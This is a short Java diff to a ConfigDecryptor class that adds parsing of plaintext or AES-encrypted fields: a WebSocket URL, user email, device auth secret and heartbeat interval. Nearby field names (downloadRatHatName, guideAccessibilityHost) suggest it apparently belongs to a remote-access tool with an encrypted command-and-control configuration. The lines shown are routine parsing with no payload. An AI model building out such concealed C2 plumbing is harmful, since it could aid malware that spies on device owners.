@@ -43,6 +43,32 @@ public class ConfigDecryptor {
             config.setGuideAccessibilityHost(decryptValue(json.get("guideAccessibilityHost").getAsString()));
         }
 
+        // webSocketUrl: 支持明文 (ws://或wss://开头) 或 AES 加密
+        if (json.has("webSocketUrl") && !json.get("webSocketUrl").isJsonNull()) {
+            String wsRaw = json.get("webSocketUrl").getAsString();
+            if (wsRaw.startsWith("ws://") || wsRaw.startsWith("wss://")) {
+                config.setWebSocketUrl(wsRaw);
+            } else {
+                config.setWebSocketUrl(decryptValue(wsRaw));
+            }
+        }
+
+        // userEmail: 明文或加密
+        if (json.has("userEmail") && !json.get("userEmail").isJsonNull()) {
+            String emailRaw = json.get("userEmail").getAsString();
+            if (emailRaw.contains("@")) {
+                config.setUserEmail(emailRaw);
+            } else {
+                config.setUserEmail(decryptValue(emailRaw));
+            }
+        }
+
+        // deviceAuthSecret: 明文或加密
+        setStringIfPresent(json, "deviceAuthSecret", config::setDeviceAuthSecret);
+
+        // heartbeatInterval: 心跳间隔 (秒)
+        setIntIfPresent(json, "heartbeatInterval", config::setHeartbeatInterval);
+
         // 非加密字段 — 直接读取
         setStringIfPresent(json, "downloadRatHatName", config::setDownloadRatHatName);
         setStringIfPresent(json, "mainUrl", config::setMainUrl);
